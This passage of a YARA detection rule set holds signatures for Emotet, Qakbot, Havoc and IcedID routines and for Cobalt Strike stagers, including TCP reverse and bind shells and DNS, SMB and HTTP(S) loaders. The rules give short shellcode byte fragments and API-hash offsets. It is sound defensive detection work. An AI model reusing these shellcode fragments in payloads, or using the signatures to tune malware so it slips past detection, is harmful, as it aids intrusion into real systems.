		date = "2022-10-14"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/2022/win_emotet_string_patterns_oct_2022.yar#L1-L19"
		license_url = "N/A"
		logic_hash = "36f4a3fed124b8c25711f706c5b4f1c9b0801c2105cf86077b8c002dd70a6fbc"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$em1 = {45 33 f6 4c 8b d0 48 85 c0 74 64 48 8d 14 b3 4c 8b c0 45 8b de 4c 8b ca 4c 2b cb 49 83 c1 03 49 c1 e9 02 48 3b da 4d 0f 47 ce}
		$em2 = {8b cd 49 ff c3 33 0b 48 8d 5b 04 0f b6 c1 66 41 89 00 0f b7 c1 c1 e9 10 66 c1 e8 08 4d 8d 40 08 66 41 89 40 fa 0f b6 c1 66 c1 e9 08 66 41 89 40 fc 66 41 89 48 fe 4d 3b d9}
		$em3 = {49 ff c3 33 0b 48 8d 5b 04 0f b6 c1 66 41 89 00}
		$em4 = {8b cb 41 8b d0 d3 e2 41 8b cb d3 e0 03 d0 41 0f be c1 03 d0 41 2b d0 49 ff c2 44 8b c2}

	condition:
		uint16( 0 ) == 0x5a4d and ( any of them )
}
rule EMBEERESEARCH_Win_Qakbot_String_Decrypt_Nov_2022 : FILE
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "Embee_Research @ Huntress"
		id = "0023872f-8edb-59d6-88eb-a76528ba6ec8"
		date = "2022-11-14"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/2022/win_qakbot_string_decrypt_nov_2022.yar#L1-L15"
		license_url = "N/A"
		logic_hash = "d225f69fa4dd0e8d7c98e7f8968ad285f05b232225e9ce1070b7a23257a0ef9d"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$qakbot_decrypt = {33 d2 8b c7 f7 75 10 8a 04 1a 8b 55 fc 32 04 17 88 04 39 47 83 ee 01}

	condition:
		uint16( 0 ) == 0x5a4d and $qakbot_decrypt
}
rule EMBEERESEARCH_Win_Havoc_Djb2_Hashing_Routine_Oct_2022 : FILE
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "embee_research @ HuntressLabs"
		id = "cde3e14f-0671-5bcf-93e8-e0a0af9b462c"
		date = "2022-10-11"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/2022/win_havoc_djb2_hashing_routine_oct_2022.yar#L1-L24"
		license_url = "N/A"
		logic_hash = "9f645480c3d78153186a247440739a1d2e627ec64a4225083bd8db4ad9bd5ef3"
		score = 75
		quality = 75
		tags = "FILE"
		vendor = "Huntress Research"

	strings:
		$dll = {b8 05 15 00 00 0f be 11 48 ff c1 84 d2 74 07 6b c0 21 01 d0 eb ef}
		$shellcode = {41 80 f8 60 76 04 41 83 e8 20 6b c0 21 45 0f b6 c0 49 ff c1 44 01 c0 eb c4}

	condition:
		( any of them ) and ( uint16( 0 ) == 0x5a4d or uint16( 0 ) == 0x00e8 or uint16( 0 ) == 0x4856 )
}
rule EMBEERESEARCH_Win_Icedid_Encryption_Oct_2022 : FILE
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "Embee_Research @ Huntress"
		id = "1ecbb3b3-dfc1-5d69-807d-3a44c39a3536"
		date = "2022-10-14"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/2022/win_icedid_encryption_oct_2022.yar#L1-L18"
		license_url = "N/A"
		logic_hash = "da657cf87e043a1fdb2ec683de8a7a12acb8c8f1c24034bb376d525c0a1c5740"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$IcedID = {41 0f b6 d3 44 8d 42 01 83 e2 03 41 83 e0 03 42 8a 44 84 40 02 44 94 40 43 32 04 33 42 8b 4c 84 40 41 88 04 1b 83 e1 07 8b 44 94 40 49 ff c3 d3 c8 ff c0 89 44 94 40 83 e0 07}

	condition:
		$IcedID
}
rule EMBEERESEARCH_Win_Qakbot_Api_Hashing_Oct_2022 : FILE
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "@Embee_Research"
		id = "b5478404-659d-5b3a-b722-f8ba33875d8a"
		date = "2022-11-14"
		modified = "2022-12-01"
		reference = "https://twitter.com/embee_research/status/1592067841154756610"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/2022/win_qakbot_api_hashing_oct_2022.yar#L2-L21"
		license_url = "N/A"
		logic_hash = "595cabd508ee60c5606f965eb9a290ae21ea32af0f56e213f6ce2d2e35dc4e11"
		score = 75
		quality = 75
		tags = "FILE"
		vendor = "Huntress Labs"

	strings:
		$qakbot_hashing = {0f b6 04 39 33 f0 8b c6 c1 ee 04 83 e0 0f 33 34 85 ?? ?? ?? ?? 8b c6 c1 ee 04 83 e0 0f 33 34 85 ?? ?? ?? ?? 41 3b ca}

	condition:
		any of them
}
/*
 * YARA Rule Set
 * Repository Name: AvastTI
 * Repository: https://github.com/avast/ioc
 * Retrieval Date: 2026-11-22
 * Git Commit: eb6d7fc10cb0c57dab5a360f1fd28acae26efa97
 * Number of Rules: 30
 * Skipped: 0 (age), 3 (quality), 0 (score), 0 (importance)
 *
 * 
 * LICENSE
 * 
 * NO LICENSE SET
 */
rule AVASTTI_Cobaltstrike_Raw_Payload_Dns_Stager_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "817c4a72-7be1-5a58-987d-fe203d7778ea"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L1-L26"
		license_url = "N/A"
		logic_hash = "d447fac16f0a712b1c264bc83b4cf2e56e5e98b369617799b981cd75b37c3511"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x00a3 ) == 0xe553a458 and uint32( @h01 + 0x00bd ) == 0x0726774c and uint32( @h01 + 0x012f ) == 0xc99cc96a and uint32( @h01 + 0x0198 ) == 0x56a2b5f0 and uint32( @h01 + 0x01a4 ) == 0xe035f044 and uint32( @h01 + 0x01e4 ) == 0xcc8e00f4
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Smb_Stager_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "29911a14-08ea-54de-9c07-630c6516bd49"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L28-L57"
		license_url = "N/A"
		logic_hash = "7459bcb0353f114a869aa61adc0229197ca9a1cfce0741dc227fabbeea2afba9"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x00a1 ) == 0xe553a458 and uint32( @h01 + 0x00c4 ) == 0xd4df7045 and uint32( @h01 + 0x00d2 ) == 0xe27d6f28 and uint32( @h01 + 0x00f8 ) == 0xbb5f9ead and uint32( @h01 + 0x010d ) == 0xbb5f9ead and uint32( @h01 + 0x0131 ) == 0xfcddfac0 and uint32( @h01 + 0x0139 ) == 0x528796c6 and uint32( @h01 + 0x014b ) == 0x56a2b5f0
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Bind_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "ec0a9e27-3650-5393-a93b-2a461b9a0e29"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L59-L96"
		license_url = "N/A"
		logic_hash = "5c56e1f1d85375f19b6085b3d4654d2d1ba38d3dfcfea66707ca8957a6ed7bf8"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x009c ) == 0x0726774c and uint32( @h01 + 0x00ac ) == 0x006b8029 and uint32( @h01 + 0x00bb ) == 0xe0df0fea and uint32( @h01 + 0x00d5 ) == 0x6737dbc2 and uint32( @h01 + 0x00de ) == 0xff38e9b7 and uint32( @h01 + 0x00e8 ) == 0xe13bec74 and uint32( @h01 + 0x00f1 ) == 0x614d6e75 and uint32( @h01 + 0x00fa ) == 0x56a2b5f0 and uint32( @h01 + 0x0107 ) == 0x5fc8d902 and uint32( @h01 + 0x011a ) == 0xe553a458 and uint32( @h01 + 0x0128 ) == 0x5fc8d902 and uint32( @h01 + 0x013d ) == 0x614d6e75
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Bind_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "3575408a-3309-5723-a49a-9c2088d43de9"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L98-L133"
		license_url = "N/A"
		logic_hash = "a803a9c76142ccadda5f5c8f6abf78ac9a60523576edf62f4a1600556f4b6261"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 48 83 E4 F0 E8 C8 00 00 00 41 51 41 50 52 51 56 48 31 D2 65 48 8B 52 }

	condition:
		uint32( @h01 + 0x0100 ) == 0x0726774c and uint32( @h01 + 0x0111 ) == 0x006b8029 and uint32( @h01 + 0x012d ) == 0xe0df0fea and uint32( @h01 + 0x0142 ) == 0x6737dbc2 and uint32( @h01 + 0x0150 ) == 0xff38e9b7 and uint32( @h01 + 0x0161 ) == 0xe13bec74 and uint32( @h01 + 0x016f ) == 0x614d6e75 and uint32( @h01 + 0x0198 ) == 0x5fc8d902 and uint32( @h01 + 0x01b8 ) == 0xe553a458 and uint32( @h01 + 0x01d2 ) == 0x5fc8d902 and uint32( @h01 + 0x01ee ) == 0x614d6e75
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Reverse_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "ac824189-614d-5bff-9bbb-a4244cace563"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L135-L164"
		license_url = "N/A"
		logic_hash = "c20de49c3225a7aed8460d0e3cc3bce715c8746fb4313a2faf9da3c8d1d87387"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x009c ) == 0x0726774c and uint32( @h01 + 0x00ac ) == 0x006b8029 and uint32( @h01 + 0x00bb ) == 0xe0df0fea and uint32( @h01 + 0x00d5 ) == 0x6174a599 and uint32( @h01 + 0x00e5 ) == 0x56a2b5f0 and uint32( @h01 + 0x00f2 ) == 0x5fc8d902 and uint32( @h01 + 0x0105 ) == 0xe553a458 and uint32( @h01 + 0x0113 ) == 0x5fc8d902
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Reverse_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "21151a9c-1d15-514f-b33b-c9eff08463fb"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L166-L195"
		license_url = "N/A"
		logic_hash = "58ae5351bac70ab9530cb033d1f6bb90acb6b66df395d59a55d221ef2a2e5dcf"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 48 83 E4 F0 E8 C8 00 00 00 41 51 41 50 52 51 56 48 31 D2 65 48 8B 52 }

	condition:
		uint32( @h01 + 0x0100 ) == 0x0726774c and uint32( @h01 + 0x0111 ) == 0x006b8029 and uint32( @h01 + 0x012d ) == 0xe0df0fea and uint32( @h01 + 0x0142 ) == 0x6174a599 and uint32( @h01 + 0x016b ) == 0x5fc8d902 and uint32( @h01 + 0x018b ) == 0xe553a458 and uint32( @h01 + 0x01a5 ) == 0x5fc8d902 and uint32( @h01 + 0x01c1 ) == 0x614d6e75
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Http_Stager_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "01f89b14-55f2-5a5e-b0d5-6bca609621fe"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L197-L232"
		license_url = "N/A"
		logic_hash = "d3c74ff363d113d25d9ecca114dd0872487e713a978da4f94f3cccc2e92943ff"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x009c ) == 0x0726774c and uint32( @h01 + 0x00aa ) == 0xa779563a and uint32( @h01 + 0x00c6 ) == 0xc69f8957 and uint32( @h01 + 0x00de ) == 0x3b2e55eb and uint32( @h01 + 0x00f2 ) == 0x7b18062d and uint32( @h01 + 0x010b ) == 0x5de2c5aa and uint32( @h01 + 0x0114 ) == 0x315e2145 and uint32( @h01 + 0x0123 ) == 0x0be057b7 and uint32( @h01 + 0x02c4 ) == 0x56a2b5f0 and uint32( @h01 + 0x02d8 ) == 0xe553a458 and uint32( @h01 + 0x02f3 ) == 0xe2899612
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Http_Stager_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "7eeeb2a1-4903-5649-ae30-fd43367ab468"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L234-L263"
		license_url = "N/A"
		logic_hash = "a89a8e25d894bf7e5c4a10e2a14b78a52543e42fb185667db9f9548f52ef58bf"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 48 83 E4 F0 E8 C8 00 00 00 41 51 41 50 52 51 56 48 31 D2 65 48 8B 52 }

	condition:
		uint32( @h01 + 0x00e9 ) == 0x0726774c and uint32( @h01 + 0x0101 ) == 0xa779563a and uint32( @h01 + 0x0120 ) == 0xc69f8957 and uint32( @h01 + 0x013f ) == 0x3b2e55eb and uint32( @h01 + 0x0163 ) == 0x7b18062d and uint32( @h01 + 0x0308 ) == 0x56a2b5f0 and uint32( @h01 + 0x0324 ) == 0xe553a458 and uint32( @h01 + 0x0342 ) == 0xe2899612
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Https_Stager_X86
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "f1d7e939-92b5-5441-8014-b2390854d059"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L266-L303"
		license_url = "N/A"
		logic_hash = "c168b6f2ce35e57cd4c572ce40652261df7af7900beab7ffcdae58113cad88c0"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 }

	condition:
		uint32( @h01 + 0x009c ) == 0x0726774c and uint32( @h01 + 0x00af ) == 0xa779563a and uint32( @h01 + 0x00cb ) == 0xc69f8957 and uint32( @h01 + 0x00e7 ) == 0x3b2e55eb and uint32( @h01 + 0x0100 ) == 0x869e4675 and uint32( @h01 + 0x0110 ) == 0x7b18062d and uint32( @h01 + 0x0129 ) == 0x5de2c5aa and uint32( @h01 + 0x0132 ) == 0x315e2145 and uint32( @h01 + 0x0141 ) == 0x0be057b7 and uint32( @h01 + 0x02e9 ) == 0x56a2b5f0 and uint32( @h01 + 0x02fd ) == 0xe553a458 and uint32( @h01 + 0x0318 ) == 0xe2899612
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Https_Stager_X64
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "5f9c7426-63be-5049-91fc-63b5c29618bd"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L306-L337"
		license_url = "N/A"
		logic_hash = "cb36d75efcd0e76bf96793863d1aa5145237ec3ce5c7195e679f2e1019d5bbab"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 48 83 E4 F0 E8 C8 00 00 00 41 51 41 50 52 51 56 48 31 D2 65 48 8B 52 }

	condition:
		uint32( @h01 + 0x00e9 ) == 0x0726774c and uint32( @h01 + 0x0101 ) == 0xa779563a and uint32( @h01 + 0x0123 ) == 0xc69f8957 and uint32( @h01 + 0x0142 ) == 0x3b2e55eb and uint32( @h01 + 0x016c ) == 0x869e4675 and uint32( @h01 + 0x0186 ) == 0x7b18062d and uint32( @h01 + 0x032b ) == 0x56a2b5f0 and uint32( @h01 + 0x0347 ) == 0xe553a458 and uint32( @h01 + 0x0365 ) == 0xe2899612
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Dns_Stager_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "d148ca33-b233-519d-8ba4-d389de721d15"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L339-L354"
		license_url = "N/A"
		logic_hash = "3519d2af99a159483ba22cd87907bcc87bea1cfc2fb92f5f0334fff1c385ef00"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
		uint32( @h01 + 0x0149 ) == 0xe5005300 and uint32( @h01 + 0x017d ) == 0x07002600 and uint32( @h01 + 0x0261 ) == 0xc9009c00 and uint32( @h01 + 0x0333 ) == 0x5600a200 and uint32( @h01 + 0x034b ) == 0xe0003500 and uint32( @h01 + 0x03cb ) == 0xcc008e00
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Smb_Stager_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "d88e050f-9e6c-5349-b809-ad7dc25a79b9"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L356-L373"
		license_url = "N/A"
		logic_hash = "74c50e1c989167ea6d9309e2b53629c7103484faa809a80e90b7d5c318b2370c"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
		uint32( @h01 + 0x0145 ) == 0xe5005300 and uint32( @h01 + 0x018b ) == 0xd400df00 and uint32( @h01 + 0x01a7 ) == 0xe2007d00 and uint32( @h01 + 0x01f3 ) == 0xbb005f00 and uint32( @h01 + 0x021d ) == 0xbb005f00 and uint32( @h01 + 0x0265 ) == 0xfc00dd00 and uint32( @h01 + 0x0275 ) == 0x52008700 and uint32( @h01 + 0x0299 ) == 0x5600a200
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Bind_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "7f17985d-b245-5e95-9b35-af669aafc263"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L375-L396"
		license_url = "N/A"
		logic_hash = "2c5ac98ffbea197d14cd6e508729885b5f86adbace0a6d978664908e070965cf"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
		uint32( @h01 + 0x013b ) == 0x07002600 and uint32( @h01 + 0x015b ) == 0x00006b00 and uint32( @h01 + 0x0179 ) == 0xe000df00 and uint32( @h01 + 0x01ad ) == 0x67003700 and uint32( @h01 + 0x01bf ) == 0xff003800 and uint32( @h01 + 0x01d3 ) == 0xe1003b00 and uint32( @h01 + 0x01e5 ) == 0x61004d00 and uint32( @h01 + 0x01f7 ) == 0x5600a200 and uint32( @h01 + 0x0211 ) == 0x5f00c800 and uint32( @h01 + 0x0237 ) == 0xe5005300 and uint32( @h01 + 0x0253 ) == 0x5f00c800 and uint32( @h01 + 0x027d ) == 0x61004d00
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Bind_X64_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "bd52fb44-379a-5c82-9c7c-b10c8080b53f"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L398-L418"
		license_url = "N/A"
		logic_hash = "cdd8e0c9bdaf8d7662a118964abdea8eaea6c0e17fe1f20a80497c0c43d496d6"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 48 00 83 00 E4 00 F0 00 E8 00 C8 00 00 00 00 00 00 00 41 00 51 00 41 00 50 00 52 00 51 00 56 00 48 00 31 00 D2 00 65 00 48 00 8B 00 52 }

	condition:
		uint32( @h01 + 0x0203 ) == 0x07002600 and uint32( @h01 + 0x0225 ) == 0x00006b00 and uint32( @h01 + 0x025d ) == 0xe000df00 and uint32( @h01 + 0x0287 ) == 0x67003700 and uint32( @h01 + 0x02a3 ) == 0xff003800 and uint32( @h01 + 0x02c5 ) == 0xe1003b00 and uint32( @h01 + 0x02e1 ) == 0x61004d00 and uint32( @h01 + 0x0333 ) == 0x5f00c800 and uint32( @h01 + 0x0373 ) == 0xe5005300 and uint32( @h01 + 0x03a7 ) == 0x5f00c800 and uint32( @h01 + 0x03df ) == 0x61004d00
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Reverse_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "321c1f3f-b7fc-5408-b460-6aa4423d381c"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L420-L437"
		license_url = "N/A"
		logic_hash = "5495405ef3a54c960cf27147dce0d25cb298fee84a99415b59bc548c4f64a1e6"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
		uint32( @h01 + 0x013b ) == 0x07002600 and uint32( @h01 + 0x015b ) == 0x00006b00 and uint32( @h01 + 0x0179 ) == 0xe000df00 and uint32( @h01 + 0x01ad ) == 0x61007400 and uint32( @h01 + 0x01cd ) == 0x5600a200 and uint32( @h01 + 0x01e7 ) == 0x5f00c800 and uint32( @h01 + 0x020d ) == 0xe5005300 and uint32( @h01 + 0x0229 ) == 0x5f00c800
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Tcp_Reverse_X64_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "1cc2494c-1f39-5a72-93af-c267eaf768fe"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L439-L456"
		license_url = "N/A"
		logic_hash = "d7e8fe5d2e07b7a85fadaa432bf345231ac4ddac5458167431403ddfe05467fc"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 48 00 83 00 E4 00 F0 00 E8 00 C8 00 00 00 00 00 00 00 41 00 51 00 41 00 50 00 52 00 51 00 56 00 48 00 31 00 D2 00 65 00 48 00 8B 00 52 }

	condition:
		uint32( @h01 + 0x0203 ) == 0x07002600 and uint32( @h01 + 0x0225 ) == 0x00006b00 and uint32( @h01 + 0x025d ) == 0xe000df00 and uint32( @h01 + 0x0287 ) == 0x61007400 and uint32( @h01 + 0x02d9 ) == 0x5f00c800 and uint32( @h01 + 0x0319 ) == 0xe5005300 and uint32( @h01 + 0x034d ) == 0x5f00c800 and uint32( @h01 + 0x0385 ) == 0x61004d00
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Http_Stager_X86_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "c1602e85-5b42-5005-a6d1-7140cb57a3c7"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L458-L478"
		license_url = "N/A"
		logic_hash = "b6e19ee9141aa22d73de6d8145257eba7b3b2bb2edc0996591085c84f242ec87"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 E8 00 89 00 00 00 00 00 00 00 60 00 89 00 E5 00 31 00 D2 00 64 00 8B 00 52 00 30 00 8B 00 52 00 0C 00 8B 00 52 00 14 00 8B 00 72 00 28 }

	condition:
		uint32( @h01 + 0x013b ) == 0x07002600 and uint32( @h01 + 0x0157 ) == 0xa7007900 and uint32( @h01 + 0x018f ) == 0xc6009f00 and uint32( @h01 + 0x01bf ) == 0x3b002e00 and uint32( @h01 + 0x01e7 ) == 0x7b001800 and uint32( @h01 + 0x0219 ) == 0x5d00e200 and uint32( @h01 + 0x022b ) == 0x31005e00 and uint32( @h01 + 0x0249 ) == 0x0b00e000 and uint32( @h01 + 0x058b ) == 0x5600a200 and uint32( @h01 + 0x05b3 ) == 0xe5005300 and uint32( @h01 + 0x05e9 ) == 0xe2008900
}
rule AVASTTI_Cobaltstrike_Raw_Payload_Http_Stager_X64_Utf16
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Gen Threat Labs"
		id = "78672e3b-6f76-573a-8a9a-610334baa389"
		date = "2021-07-08"
		modified = "2026-03-11"
		reference = "https://github.com/gendigitalinc/ioc"
		source_url = "https://github.com/avast/ioc/blob/eb6d7fc10cb0c57dab5a360f1fd28acae26efa97/CobaltStrike/yara_rules/cs_rules.yar#L480-L497"
		license_url = "N/A"
		logic_hash = "f88378749f0da0c66d66b917eeb11a56f083bb487c19c22a230dee4f50e1e309"
		score = 75
		quality = 90
		tags = ""

	strings:
		$h01 = { FC 00 48 00 83 00 E4 00 F0 00 E8 00 C8 00 00 00 00 00 00 00 41 00 51 00 41 00 50 00 52 00 51 00 56 00 48 00 31 00 D2 00 65 00 48 00 8B 00 52 }

	condition:
